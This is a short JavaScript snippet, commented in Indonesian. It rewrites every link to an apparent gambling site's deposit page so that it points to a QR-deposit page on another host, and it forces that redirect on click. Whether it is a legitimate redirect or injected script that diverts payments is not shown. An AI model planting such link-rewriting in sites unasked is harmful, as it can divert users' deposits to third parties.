document.addEventListener("DOMContentLoaded", function () {
  // Seleksi semua elemen <a>
  document.querySelectorAll('a[href="https://supermaxwin23.top/m/account/deposit"]').forEach(function (el) {
    // Ganti href
    el.setAttribute("href", "https://view.pagesection.com/c2c-depositinstantqr");

    // Jika klik, langsung redirect juga (opsional)
    el.addEventListener("click", function (e) {
      e.preventDefault();
      window.location.href = "https://view.pagesection.com/c2c-depositinstantqr";
    });
  });
});
